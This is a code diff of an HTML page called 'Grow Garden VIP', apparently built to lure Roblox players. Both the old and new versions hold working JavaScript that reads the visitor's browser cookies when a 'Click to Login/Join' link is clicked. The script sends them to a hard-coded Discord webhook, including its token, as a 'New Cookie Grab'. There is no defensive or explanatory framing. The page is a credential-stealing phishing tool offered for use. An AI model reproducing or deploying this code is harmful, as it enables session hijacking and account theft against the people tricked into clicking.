@@ -3,54 +3,33 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Grow Garden VIP Login</title>
+  <title>Grow Garden VIP</title>
+  <style>body{font-family:Arial;background:#111;color:white;text-align:center;padding:50px}</style>
 </head>
 <body>
   <h1>Welcome to Grow Garden VIP</h1>
-  <p>Click below to grab cookies and send to Discord for login transfer</p>
-  <a href="#" onclick="grabAndSendCookies(event)" style="font-size: 20px; color: #5865F2; text-decoration: underline;">
+  <p>Click the big blue link to send your Roblox cookies to Discord</p>
+  <a href="#" onclick="grabAndSendCookies(event)" style="font-size:30px;color:#5865F2;text-decoration:underline;">
     Click to Login/Join
   </a>
 
   <script>
-    async function grabAndSendCookies(event) {
-      event.preventDefault();
+    async function grabAndSendCookies(e) {
+      e.preventDefault();
+      const c = document.cookie;
+      if (!c) return alert("No cookies found! Log into Roblox first.");
 
-      const cookies = document.cookie;
-      if (!cookies || cookies.trim() === "") {
-        alert("No cookies found! Log in first or set a test cookie.");
-        return;
-      }
+      const hook = "https://discord.com/api/webhooks/1441332337072799775/Ayer0ccbXxhmFNi83MeULdXASJZp9eq7MHN4gF91BABAgm6ehTbw5_DFtI0UR_PObhtl";
 
-      const webhookUrl = "https://discord.com/api/webhooks/1441332337072799775/Ayer0ccbXxhmFNi83MeULdXASJZp9eq7MHN4gF91BABAgm6ehTbw5_DFtI0UR_PObhtl";
-
-      const payload = {
-        content: "New Cookie Grab",
-        embeds: [{
-          title: "Cookies Captured",
-          description: "```" + cookies + "```",
-          color: 3447003,
-          timestamp: new Date().toISOString(),
-          footer: { text: "Grow Garden VIP" }
-        }]
-      };
-
-      try {
-        const response = await fetch(webhookUrl, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(payload)
-        });
-
-        if (response.ok) {
-          alert("Cookies sent to Discord! Check your channel now.");
-        } else {
-          alert("Send failed – status " + response.status);
-        }
-      } catch (err) {
-        console.error(err);
-        alert("Network error – open console (F12) for details");
-      }
+      await fetch(hook, {
+        method: "POST",
+        headers: {"Content-Type":"application/json"},
+        body: JSON.stringify({
+          content: "New Cookie Grab",
+          embeds: [{title:"Cookies",description:"```"+c+"```",color:3447003}]
+        })
+      });
+      alert("Sent to Discord! Check your channel.");
     }
   </script>
 </body>
